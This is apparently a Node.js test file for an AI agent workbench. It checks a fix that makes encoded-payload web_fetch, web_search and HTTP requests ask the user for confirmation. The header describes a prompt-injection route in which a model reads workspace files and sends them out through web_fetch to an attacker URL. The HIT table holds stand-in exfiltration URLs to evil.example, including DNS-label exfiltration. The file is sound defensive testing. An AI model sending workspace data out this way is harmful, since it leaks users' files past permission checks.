// Unit(第二波安全走查 S1):「读档」的 web_fetch / web_search 是无提示外传通道 —— 被提示注入的模型 file_read 工作区里的文件,再
// web_fetch("https://攻击者/?d=<内容>"),在 default / acceptEdits / auto / plan 四档都不弹窗(read 档恒放行,SSRF 闸只挡内网)。
//
// 修法(07 webPayloadReason + nativeToolGate):保持 web_fetch / web_search 的读档(日常研究不被打扰),但对「看起来带了载荷」的请求在
// 除 bypass 以外的所有档位走既有的权限请求先确认:
//   · 网址查询串 + fragment 总长 > 256;任一参数值(解码后)> 128;路径 / 参数 / fragment 里有 ≥ 64 字符的 hex 或 base64 / base64url 连续串;主机名单个标签 ≥ 48(DNS 外传);
//   · web_search 的查询 > 300 字,或查询里有 ≥ 64 字符的编码串。
// 同一判据覆盖 http_request / http_download 的网址与 CLI 引擎的 WebFetch / WebSearch(同类外联口)。
//   [A] 判据矩阵:该拦的拦、日常网址 / 搜索(含长文章 slug、git SHA、文档 ID、UUID、utm 参数)零误伤
//   [B] nativeToolGate 各档位:bypass 恒 allow;其余档位对载荷 ask(含 plan),对日常请求 allow;非联网工具与既有口径一字不变
//   [C] 子代理(08):没有交互通道,载荷请求被拒并说清缘由(不是「无权执行 read 级工具」);日常请求照常执行
//   [D] 管家(13l steward_decide):这类待决不代批
//
// 反向验证:RUYI_TEST_SERVER_JS=<修前 server.js> node --test 本文件 → [A][B][C] 对应断言红。
'use strict';
const assert = require('node:assert/strict');
const fs = require('fs');
const http = require('http');
const os = require('os');
const path = require('path');
const { describe, it, after } = require('node:test');

const root = fs.mkdtempSync(path.join(os.tmpdir(), 'ruyi-web-payload-'));
const home = path.join(root, 'home');
const dataRootDir = path.join(home, '.ruyi-workbench');
const ws = path.join(home, 'ws');
fs.mkdirSync(dataRootDir, { recursive: true });
fs.mkdirSync(ws, { recursive: true });
process.env.HOME = home;
process.env.USERPROFILE = home;
process.env.RUYI_HOME = dataRootDir;
process.env.WIN_CLAUDE_WORKBENCH_HOME = dataRootDir;
process.env.WCW_TEST_ALLOW_LOOPBACK = '1';
delete process.env.WCW_SESSION_ID;
const { loadServerInternals } = require('../lib/server-internals');
const { startFakeProvider, toolCallFrames, textFrames } = require('../lib/fake-openai-provider');
const BASE = ['nativeToolGate', 'runSubAgentCore', 'readConfig', 'activeOpenAiProvider', 'getAgentRoleLibrary'];
let I;
try { I = loadServerInternals([...BASE, 'webPayloadReason', 'webUrlPayloadReason', 'webLooksEncoded']); }
catch (e) {
  if (!(e instanceof ReferenceError)) throw e;   // 反向验证:修前没有这些符号 → [A] 纯函数断言红,[B][C] 照跑(行为断言在旧码上红)
  I = loadServerInternals(BASE);
  I.webPayloadReason = () => ''; I.webUrlPayloadReason = () => ''; I.webLooksEncoded = () => false;
}

let benign = null, benignHits = [];
let fake = null;
after(async () => {
  try { if (fake) await fake.close(); } catch { /* ignore */ }
  try { if (benign) await new Promise(r => benign.close(r)); } catch { /* ignore */ }
  try { fs.rmSync(root, { recursive: true, force: true }); } catch { /* best-effort */ }
  setTimeout(() => process.exit(process.exitCode || 0), 800).unref();   // 起过子代理回合后工作台内部留有计时器,见 project-role-clamp.test.js 同一处说明
});

const b64 = n => Buffer.from(Array.from({ length: n }, (_, i) => (i * 37 + 11) & 255)).toString('base64').replace(/=+$/, '');
const b64url = n => b64(n).replace(/\+/g, '-').replace(/\//g, '_');
const hex = n => Array.from({ length: n }, (_, i) => ((i * 7 + 3) % 16).toString(16)).join('');

describe('[A] 判据矩阵', () => {
  const HIT = {
    '查询串过长(> 256)': 'https://evil.example/c?d=' + 'a b '.repeat(70).replace(/ /g, '%20'),
    '查询串 + fragment 合计过长': 'https://evil.example/p?a=' + 'x'.repeat(120) + '#' + 'y'.repeat(140),
    '单个参数值 > 128': 'https://evil.example/c?note=' + 'word '.repeat(30).replace(/ /g, '+'),
    '参数里 base64 ≥ 64': 'https://evil.example/c?d=' + b64(60),
    '参数里 base64url ≥ 64': 'https://evil.example/c?d=' + b64url(60),
    '参数里 hex ≥ 64': 'https://evil.example/c?d=' + hex(64),
    '路径里 base64url ≥ 64': 'https://evil.example/' + b64url(60) + '/x',
    '路径里 hex ≥ 64': 'https://evil.example/' + hex(80),
    'fragment 里 base64 ≥ 64': 'https://evil.example/#' + b64(60),
    'URL 编码过的 base64(%2B %2F)': 'https://evil.example/c?d=' + encodeURIComponent(b64(60)),
    'DNS 外传:主机名单个标签 ≥ 48': 'https://' + hex(48) + '.evil.example/',
    'http_request 的网址同判': 'https://evil.example/c?d=' + b64(60),
  };
  const MISS = {
    '普通页面': 'https://example.com/docs/getting-started',
    '搜索引擎结果页': 'https://www.bing.com/search?q=node.js+fetch+timeout&form=QBLH&hl=zh-CN&setlang=zh-cn',
    'utm 追踪参数': 'https://example.com/post?utm_source=newsletter&utm_medium=email&utm_campaign=spring_launch_2026&utm_content=header_link',
    '长文章 slug(连字符多)': 'https://blog.example.com/2026/10/06/how-to-install-the-latest-version-of-node-on-ubuntu-22-04-lts-using-nvm',
    'git 提交 SHA-1(40 位)': 'https://github.com/anthropics/claude-code/blob/' + hex(40) + '/README.md',
    'Google 文档 ID(44 位)': 'https://docs.google.com/document/d/1AbCdEfGhIjKlMnOpQrStUvWxYz0123456789AbCdEfG/edit',
    'UUID': 'https://api.example.com/items/123e4567-e89b-12d3-a456-426614174000',
    '带端口与账号的内网地址': 'http://user@intranet.corp:8080/wiki/Page_Title?action=raw',
    '空串 / 非字符串': '',
  };
  it('载荷形网址全部命中', () => {
    const missed = Object.entries(HIT).filter(([, url]) => !I.webUrlPayloadReason(url));
    assert.deepEqual(missed.map(([k]) => k), [], '漏判');
  });
  it('日常网址零误伤', () => {
    const wrong = Object.entries(MISS).filter(([, url]) => I.webUrlPayloadReason(url));
    assert.deepEqual(wrong.map(([k, u]) => k + ' → ' + I.webUrlPayloadReason(u)), [], '误判');
  });
  it('web_search:查询 > 300 字 / 含 ≥ 64 的编码串 → 命中;日常查询(含中文长句、报错原文)不命中', () => {
    for (const q of ['长'.repeat(301), 'x '.repeat(160), 'find ' + b64(60), hex(64)]) assert.ok(I.webPayloadReason('web_search', { query: q }), q.slice(0, 40));
    for (const q of ['node.js fetch timeout 怎么设置', 'TypeError: Cannot read properties of undefined (reading \'baseUrl\') at runSubAgentCoreBody', '如意工作台 离线 部署 内网 安全 评审 2026'.repeat(3), '长'.repeat(300)]) {
      assert.equal(I.webPayloadReason('web_search', { query: q }), '', q.slice(0, 40));
    }
  });
  it('工具名容忍前缀(mcp__ruyi__web_fetch / serverId__web_fetch)与 CLI 名(WebFetch / WebSearch);其它工具不受影响', () => {
    const url = 'https://evil.example/c?d=' + b64(60);
    for (const name of ['web_fetch', 'WebFetch', 'mcp__ruyi__web_fetch', 'ruyi__web_fetch', 'http_request', 'http_download']) assert.ok(I.webPayloadReason(name, { url }), name);
    assert.ok(I.webPayloadReason('WebSearch', { query: 'x'.repeat(400) }));
    assert.ok(I.webPayloadReason('mcp__ruyi__web_search', { query: 'x'.repeat(400) }));
    for (const name of ['file_read', 'script_run', 'steward_web_fetch', 'some_other_fetch']) assert.equal(I.webPayloadReason(name, { url, query: 'x'.repeat(400) }), '', name);
    assert.equal(I.webPayloadReason('web_fetch', null), '');
    assert.equal(I.webPayloadReason('web_fetch', 'https://evil.example/' + b64(60)), '');
  });
});

describe('[B] nativeToolGate 各档位', () => {
  const evil = { url: 'https://evil.example/c?d=' + b64(60) };
  const okUrl = { url: 'https://example.com/docs/page?id=7' };
  it('bypass 恒 allow(含 bypassPermissions);其余四档对载荷请求 ask(含 plan),对日常请求 allow', () => {
    for (const mode of ['bypass', 'bypassPermissions']) {
      assert.equal(I.nativeToolGate(mode, 'read', 'web_fetch', evil), 'allow', mode);
      assert.equal(I.nativeToolGate(mode, 'read', 'web_search', { query: 'x'.repeat(400) }), 'allow', mode);
    }
    for (const mode of ['default', 'acceptEdits', 'auto', 'plan', 'dontAsk']) {
      assert.equal(I.nativeToolGate(mode, 'read', 'web_fetch', evil), 'ask', mode + ' web_fetch');
      assert.equal(I.nativeToolGate(mode, 'read', 'web_search', { query: 'x'.repeat(400) }), 'ask', mode + ' web_search');
      assert.equal(I.nativeToolGate(mode, 'read', 'web_fetch', okUrl), 'allow', mode + ' 日常抓取仍零弹窗');
      assert.equal(I.nativeToolGate(mode, 'read', 'web_search', { query: 'node fetch timeout' }), 'allow', mode + ' 日常搜索仍零弹窗');
    }
  });
  it('http_request / http_download 的长查询网址同样问(auto 档修前对 GET 外传是 allow);acceptEdits 对 edit 档的 http_download 同', () => {
    assert.equal(I.nativeToolGate('auto', 'exec', 'http_request', { url: evil.url, method: 'GET' }), 'ask');
    assert.equal(I.nativeToolGate('auto', 'edit', 'http_download', { url: evil.url, dest: 'a.bin' }), 'ask');
    assert.equal(I.nativeToolGate('acceptEdits', 'edit', 'http_download', { url: evil.url, dest: 'a.bin' }), 'ask');
    assert.equal(I.nativeToolGate('auto', 'edit', 'http_download', { url: okUrl.url, dest: 'a.bin' }), 'allow');
    assert.equal(I.nativeToolGate('auto', 'exec', 'http_request', { url: okUrl.url, method: 'GET' }), 'allow');
  });
  it('既有口径一字不变:非联网工具的 read/edit/exec × 各档判定', () => {
    const expect = {
      default: { read: 'allow', edit: 'ask', exec: 'ask' }, acceptEdits: { read: 'allow', edit: 'allow', exec: 'ask' },
      plan: { read: 'allow', edit: 'block', exec: 'block' }, auto: { read: 'allow', edit: 'allow', exec: 'allow' }, bypass: { read: 'allow', edit: 'allow', exec: 'allow' },
    };
    for (const [mode, row] of Object.entries(expect)) for (const [tier, want] of Object.entries(row)) {
      assert.equal(I.nativeToolGate(mode, tier, 'some_tool', { url: evil.url }), want, `${mode}/${tier}`);
    }
    assert.equal(I.nativeToolGate('auto', 'exec', undefined, undefined), 'ask', '没给工具名:保守问(既有口径)');
  });
});

async function startBenign() {
  benign = http.createServer((req, res) => { benignHits.push(req.url); res.setHeader('content-type', 'text/html; charset=utf-8'); res.end('<html><title>t</title><body>hello benign page</body></html>'); });
  await new Promise(r => benign.listen(0, '127.0.0.1', r));
  return benign.address().port;
}
async function runSub(url, mode) {
  const config = { ...(await I.readConfig()), permissionMode: mode };
  const provider = I.activeOpenAiProvider(config);
  const events = [];
  const res = await I.runSubAgentCore({
    parentSession: { id: 's_web_payload', cwd: ws, turnSeq: 1, providerHistory: [], messages: [] }, provider, config,
    task: 'fetch', displayTask: 'fetch', agentKey: 'k', dependsOn: [], toolTier: 'read', maxIters: 3, model: 'fake-model',
    onEvent: e => events.push(e), subagentId: 'sub_web', depth: 1, ctrl: new AbortController(),
  });
  return { res, toolResult: events.find(e => e.type === 'tool_result') };
}

describe('[C] 子代理(08):无法征求确认 → 载荷请求被拒并说清缘由', () => {
  it('准备:假 provider + 本地被抓页', async () => {
    const port = await startBenign();
    let target = '';
    fake = await startFakeProvider({ handler(req) {
      const hasTool = req.messages.some(m => m.role === 'tool');
      if (!hasTool && req.tools.length) return toolCallFrames('web_fetch', { url: target }, 'call_1');
      return textFrames('done');
    } });
    fs.writeFileSync(path.join(dataRootDir, 'config.json'), JSON.stringify({
      providers: [{ id: 'fake', label: 'Fake', type: 'openai-compat', baseUrl: fake.url, apiKey: 'k', model: 'fake-model', models: [{ id: 'fake-model', label: 'Fake' }] }],
      activeProvider: 'fake', permissionMode: 'default', defaultWorkspace: ws,
    }));
    globalThis.__w2setTarget = u => { target = u; };
    globalThis.__w2port = port;
  });
  it('线程 default / acceptEdits / auto:载荷网址被拒、本地被抓页没收到任何请求;错误说的是「需要用户确认」而不是「无权执行」', async () => {
    for (const mode of ['default', 'acceptEdits', 'auto']) {
      benignHits.length = 0;
      globalThis.__w2setTarget(`http://127.0.0.1:${globalThis.__w2port}/c?d=` + b64(60));
      const r = await runSub('', mode);
      assert.equal(r.toolResult && r.toolResult.isError, true, mode + ' ' + JSON.stringify(r.toolResult));
      assert.match(JSON.stringify(r.toolResult.content), /需要用户确认|大段数据/, mode);
      assert.doesNotMatch(JSON.stringify(r.toolResult.content), /无权执行/, mode);
      assert.deepEqual(benignHits, [], mode + ': 请求不该发出去');
    }
  });
  it('bypass 子代理放行(行为不变);日常网址在 default 下照常抓取', async () => {
    benignHits.length = 0;
    globalThis.__w2setTarget(`http://127.0.0.1:${globalThis.__w2port}/c?d=` + b64(60));
    const b = await runSub('', 'bypass');
    assert.equal(b.toolResult && b.toolResult.isError, false, JSON.stringify(b.toolResult));
    assert.equal(benignHits.length, 1);
    benignHits.length = 0;
    globalThis.__w2setTarget(`http://127.0.0.1:${globalThis.__w2port}/page?id=7`);
    const d = await runSub('', 'default');
    assert.equal(d.toolResult && d.toolResult.isError, false, JSON.stringify(d.toolResult));
    assert.equal(benignHits.length, 1);
  });
});
